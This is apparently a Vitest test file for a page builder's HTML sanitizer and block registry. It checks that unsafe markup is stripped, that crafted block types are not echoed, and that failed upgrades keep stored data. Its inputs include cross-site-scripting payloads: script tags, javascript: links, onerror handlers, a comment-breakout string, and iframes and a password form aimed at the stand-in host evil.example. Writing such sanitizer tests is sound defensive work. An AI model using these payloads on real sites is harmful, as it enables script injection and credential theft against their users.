import { describe, expect, it } from "vitest";
import { BlockRegistry, codeLanguageClass, createBlockRegistrySync, sanitizeBlockDocument, sanitizePluginPreviewHtml } from "../../src/index.js";

/** Preview parity and unavailable-block safety (justflows-ce#306). */

describe("plugin preview sanitizer", () => {
  it("keeps the markup that makes a plugin block look like it does on the page", () => {
    const html =
      '<article class="acme-card" data-variant="pro" aria-labelledby="t1"><header class="acme-card__head"><h3 id="t1" class="acme-card__title">Pro</h3></header>' +
      '<nav class="acme-card__nav"><a class="acme-card__link" href="/plans">Plans</a></nav>' +
      '<span class="acme-badge" style="color: #fff; padding: 2px 4px; display: inline-flex">New</span>' +
      '<svg class="acme-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2l3 7h7l-6 4 2 7-6-4-6 4 2-7-6-4h7z" fill="currentColor"/></svg>' +
      '<h2 data-jf-inline="title">Title</h2></article>';
    const clean = sanitizePluginPreviewHtml(html);
    for (const kept of ['<article class="acme-card" data-variant="pro" aria-labelledby="t1">', '<header class="acme-card__head">', '<nav class="acme-card__nav">', 'class="acme-card__link" href="/plans"', 'style="color:#fff;padding:2px 4px;display:inline-flex"', 'viewBox="0 0 24 24"', '<path d=', 'data-jf-inline="title"']) {
      expect(clean).toContain(kept);
    }
  });

  it("drops anything that runs code, calls out, or could cover the builder", () => {
    const clean = sanitizePluginPreviewHtml(
      '<div onclick="steal()" style="position: fixed; inset: 0; background-image: url(https://evil.example/x.png); color: red">' +
        '<script>alert(1)</script><iframe src="https://evil.example"></iframe><a href="javascript:alert(1)">x</a>' +
        '<img src="https://evil.example/t.gif" onerror="x()"><form action="https://evil.example"><input name="pw"></form>' +
        '<svg><use href="https://evil.example/s.svg#i"/><foreignObject><div>x</div></foreignObject></svg></div>',
    );
    for (const gone of ["onclick", "position", "url(", "<script", "<iframe", "javascript:", "onerror", "<form", "<input", "<use", "foreignObject"]) {
      expect(clean).not.toContain(gone);
    }
    expect(clean).toContain("color:red");
  });
});

describe("missing blocks on the public page", () => {
  it("never echoes a crafted type into the page", () => {
    const doc = sanitizeBlockDocument({ version: 1, blocks: [{ id: "a", type: "x --><img src=x onerror=alert(1)><!--", version: 1, props: {} }] });
    const html = createBlockRegistrySync().renderNode(doc.blocks[0] as never);
    expect(html).toBe("<!-- missing block -->");
    expect(createBlockRegistrySync().renderNode({ type: "acme.gone", props: {} })).toBe("<!-- missing block: acme.gone -->");
  });
});

describe("code language classes", () => {
  it("only become one well-formed class", () => {
    expect(codeLanguageClass("TypeScript")).toBe("language-typescript");
    expect(codeLanguageClass("c#")).toBe("language-c#");
    expect(codeLanguageClass("C sharp")).toBe("");
    expect(codeLanguageClass('" onmouseover="x')).toBe("");
    expect(codeLanguageClass("")).toBe("");
    const html = createBlockRegistrySync().renderNode({ type: "core.code", props: { code: "x", language: "two words" } });
    expect(html).toBe("<pre><code>x</code></pre>");
  });
});

describe("failed upgrades", () => {
  it("keep the stored props and say the upgrade failed", () => {
    const registry = new BlockRegistry();
    registry.register({
      type: "acme.card",
      version: 2,
      title: "Card",
      schema: {},
      validateProps: (raw) => raw as Record<string, unknown>,
      render: (props) => `<p>${String(props.title ?? props.heading)}</p>`,
      migrations: [{ from: 1, to: 2, migrate: () => { throw new Error("bad data"); } }],
    } as never);
    const stored = { id: "c", type: "acme.card", version: 1, props: { heading: "Old" }, children: [] };
    const result = registry.migrateNodeResult(stored);
    expect(result.failed).toBe(true);
    expect(result.node).toBe(stored);
    expect(registry.renderNode(stored)).toContain("Old");
    /** A block stored at a newer version than the active plugin's is reported too. */
    expect(registry.migrateNodeResult({ ...stored, version: 5 }).failed).toBe(true);
    expect(registry.migrateNodeResult({ ...stored, version: 2 }).failed).toBe(false);
  });
});
